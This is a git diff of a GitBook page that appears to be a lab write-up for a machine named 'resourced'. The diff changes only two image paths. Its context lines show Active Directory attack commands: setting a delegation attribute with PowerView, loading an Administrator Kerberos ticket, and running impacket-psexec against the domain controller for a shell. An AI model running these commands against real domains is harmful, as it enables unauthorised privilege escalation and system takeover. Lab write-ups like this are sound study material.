@@ -298,7 +298,7 @@ Get-DomainComputer resourcedc | Set-DomainObject -Set @{'msds-allowedtoactonbeha
 
 Once we have run these, it should work and we can check `klist` to see that we have the administrator's ticket:
 
-<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 However, even with this ticket, it appears we still cannot access the administrator's desktop (and also we still don't have a shell...)
 
@@ -331,6 +331,6 @@ $ export KRB5CCNAME=./Administrator.ccache
 $ sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.219.175
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 Rooted!
